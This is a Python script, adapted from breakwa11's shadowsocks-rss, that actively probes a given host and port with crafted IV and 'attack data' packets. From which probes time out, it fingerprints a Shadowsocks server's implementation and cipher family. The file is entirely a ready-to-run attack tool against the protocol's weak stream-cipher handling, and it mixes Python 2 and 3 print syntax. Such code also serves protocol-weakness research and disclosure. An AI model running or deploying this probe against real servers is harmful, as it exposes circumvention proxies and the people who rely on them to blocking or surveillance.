#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
Copyleft (c) 2016 breakwa11
https://github.com/breakwa11/shadowsocks-rss

changed by Osborne_ZL
'''
import socket
import os
import struct
import threading
import sys

iv_buffer_max_size = 256  # from ss-libev setting
scan_max_try = 128
max_thread_num = 16


def compat_ord(s):
    if type(s) == int:
        return s
    return _ord(s)


def compat_chr(d):
    if bytes == str:
        return _chr(d)
    return bytes([d])


_ord = ord
_chr = chr
ord = compat_ord
chr = compat_chr


def to_bytes(s):
    if bytes != str:
        if type(s) == str:
            return s.encode('utf-8')
    return s


def to_str(s):
    if bytes != str:
        if type(s) == bytes:
            return s.decode('utf-8')
    return s


def random_string(length):
    return os.urandom(length)


def test_single(iv, ip, port, addrtype, attack_data, timeout=10):
    try:
        addrs = socket.getaddrinfo(ip, port, 0, socket.SOCK_STREAM, socket.SOL_TCP)
        af, socktype, proto, canonname, sa = addrs[0]
        s = socket.socket(af, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(sa)
        s.send(iv + to_bytes(chr(addrtype)) + attack_data)
        # print("the send data: %s"%(iv + to_bytes(chr(addrtype)) + attack_data))
        ok = False
        try:
            ret = s.recv(1024)
            # print ("the recv data_len: %d"%(len(ret)))
        except socket.timeout:
            ok = True
            addr = s.getsockname()
            print addr
        except:
            pass
        return ok
    except:
        pass


class TestThread(threading.Thread):
    def __init__(self, lock, semaphore, index, attack_ok_list, params):
        threading.Thread.__init__(self)
        self.lock = lock
        self.semaphore = semaphore
        self.index = index
        self.params = params
        self.attack_ok_list = attack_ok_list
        semaphore.acquire()

    def run(self):
        for retry in range(3):
            ok = test_single(*self.params)
            if ok is None:
                continue
            if ok:
                self.lock.acquire()
                self.attack_ok_list.append([self.params[0], self.params[3], self.index])  # iv,addrtype,index
                self.lock.release()
            break
        self.semaphore.release()


def scan(iv_len, addr, port):
    print('scan iv size is %d' % iv_len)
    iv_data = random_string(iv_len - 2)
    encryptor_info = {}
    encryptor_info[16] = 'rc4-md5/aes'
    encryptor_info[8] = 'chacha20/salsa20'
    encryptor_info[12] = 'chacha20-ietf'
    attack_ok_list = []
    addrtype = 0
    att_data_len = 6
    attack_data = random_string(att_data_len)
    attack_fail = False
    lock = threading.Lock()
    semaphore = threading.Semaphore(max_thread_num)
    for index in range(scan_max_try + iv_buffer_max_size):
        if index % 50 == 10:
            print("%d%%" % (index * 100 / (scan_max_try + iv_buffer_max_size)))
        iv = iv_data + struct.pack('>H', index)
        if index >= 8 + max_thread_num and len(attack_ok_list) > index - max_thread_num:
            attack_fail = True
            break
        testThread = TestThread(lock, semaphore, index, attack_ok_list, (iv, addr, port, addrtype, attack_data))
        testThread.start()

    print("Waiting response")
    for thread_num in range(max_thread_num):
        semaphore.acquire()

    print("attack size %d" % (len(attack_ok_list),))
    if len(attack_ok_list) == 0:
        attack_fail = True
    if attack_fail:
        return False

    if len(attack_ok_list) >= 1 and len(attack_ok_list) <= 33:
        print("%s:%d seems a Shadowsocks-python/libev server. Double check now" % (addr, port))
    elif len(attack_ok_list) >= 50 and len(attack_ok_list) <= 90:
        print("%s:%d seems a Shadowsocks-go/qt server. Double check now" % (addr, port))
    else:
        print("%s:%d seems a Shadowsocks-libev server. Double check now" % (addr, port))

    attack_data2 = random_string(att_data_len)
    while attack_data2 == attack_data:
        attack_data2 = random_string(att_data_len)
    for attack_item in attack_ok_list:
        if attack_item[2] >= scan_max_try:
            break
        for retry in range(3):
            ok = test_single(attack_item[0], addr, port, attack_item[1], attack_data2)
            if ok is not None:
                break
        if ok:
            if len(attack_ok_list) >= 1 and len(attack_ok_list) <= 33:
                for retry in range(3):
                    ok = test_single(attack_item[0], addr, port, attack_item[1], attack_data2)
                    if ok is not None:
                        break
                if ok is False:
                    print(
                    "%s:%d is a Shadowsocks-libev server with %s encryptor" % (addr, port, encryptor_info[iv_len]))
                else:
                    print(
                    "%s:%d is a Shadowsocks-python server with %s encryptor" % (addr, port, encryptor_info[iv_len]))
            elif len(attack_ok_list) <= 90:
                print("%s:%d is a Shadowsocks-go/qt server with %s encryptor" % (addr, port, encryptor_info[iv_len]))
            else:
                print("%s:%d is a Shadowsocks-libev v2.5.0 or newer server with %s encryptor" % (
                addr, port, encryptor_info[iv_len]))
            return True
    return False


def main(addr, port):
    if scan(16, addr, port):  # test your target server (rc4-md5/aes/camellia encryptor)
        return
    if scan(12, addr, port):  # test your target server (chacha20-ietf encryptor)
        return
    if scan(8, addr, port):  # test your target server (chacha20/salsa20/bf-cfb encryptor)
        return
    print("%s:%d is an unknown server" % (addr, port))


if __name__ == '__main__':
    addr = sys.argv[1]  # set the server ip or hostname
    port = int(sys.argv[2])  # set the server port
    main(addr, port)
